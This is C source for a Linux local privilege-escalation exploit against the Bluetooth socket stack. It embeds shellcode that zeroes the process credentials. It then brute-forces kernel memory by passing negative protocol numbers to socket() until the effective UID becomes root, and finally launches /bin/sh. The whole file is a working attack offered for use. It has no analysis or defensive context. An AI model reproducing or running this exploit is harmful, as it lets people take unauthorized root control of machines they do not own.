#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <unistd.h>
#include <limits.h>
#include <signal.h>
#include <sys/wait.h>

#define KERNEL_SPACE_MEMORY_BRUTE_START 0xc0000000
#define KERNEL_SPACE_MEMORY_BRUTE_END   0xffffffff
#define KERNEL_SPACE_BUFFER 0x100000


char asmcode[] = /*Global shellcode*/

"\xb8\x00\xf0\xff\xff\x31\xc9\x21\xe0\x8b\x10\x89\x8a"
"\x80\x01\x00\x00\x31\xc9\x89\x8a\x7c\x01\x00\x00\x8b"
"\x00\x31\xc9\x31\xd2\x89\x88\x90\x01\x00\x00\x89\x90"
"\x8c\x01\x00\x00\xb8\xff\xff\xff\xff\xc3";



struct net_proto_family {
 int family;
 int (*create) (int *sock, int protocol);
 short authentication;
 short encryption;
 short encrypt_net;
 int   *owner;
 };


int check_zombie_child(int status,pid_t pid)
{
 waitpid(pid,&status,0);
 if(WIFEXITED(status))
  {
  if(WEXITSTATUS(status) != 0xFF)
   exit(-1);  
  }
  else if (WIFSIGNALED(status))
    {
     printf("KERNEL Oops. Exit Code = %d.(%s)\n",WTERMSIG(status),strsignal(WTERMSIG(status)));
     return(WTERMSIG(status));
    }
}


int brute_socket_create (int negative_proto_number)
{
 socket(AF_BLUETOOTH,SOCK_RAW, negative_proto_number); /* overflowing proto number with negative 32bit value */
 int i;
 i = geteuid();
 printf("Checking the Effective user id after overflow : UID = %d\n",i);
if(i)
exit(EXIT_FAILURE);
 printf("0wnage D0ne bro.\n");
 execl("/bin/sh","sh",NULL);
 exit(EXIT_SUCCESS);
}


int main(void)
{

pid_t pid;
int counter;
int status;
int *kernel_return;

char kernel_buffer[KERNEL_SPACE_BUFFER];
unsigned int brute_start;
unsigned int where_kernel;

struct net_proto_family *bluetooth;

bluetooth = (struct net_proto_family *) malloc(sizeof(struct net_proto_family));
bzero(bluetooth,sizeof(struct net_proto_family));

bluetooth->family = AF_BLUETOOTH;
bluetooth->authentication = 0x0;  /* No Authentication */
bluetooth->encryption     = 0x0; /* No Encryption */
bluetooth->encrypt_net    = 0x0;  /* No Encrypt_net */
bluetooth->owner          = 0x0;  /* No fucking owner   */
bluetooth->create         = (int *) asmcode;



kernel_return = (int *) kernel_buffer;

for( counter = 0; counter < KERNEL_SPACE_BUFFER; counter+=4, kernel_return++)
   *kernel_return = (int)bluetooth;

brute_start =  KERNEL_SPACE_MEMORY_BRUTE_START;
printf("Bluetooth stack local root exploit\n");
printf("http://backdoored/net");

while ( brute_start < KERNEL_SPACE_MEMORY_BRUTE_END )
 {
   where_kernel = (brute_start - (unsigned int)&kernel_buffer) / 0x4 ;
   where_kernel = -where_kernel;

   pid = fork();
   if(pid == 0 )
   brute_socket_create(where_kernel);
   check_zombie_child(status,pid);
   brute_start += KERNEL_SPACE_BUFFER;
   fflush(stdout);
}
return 0;
}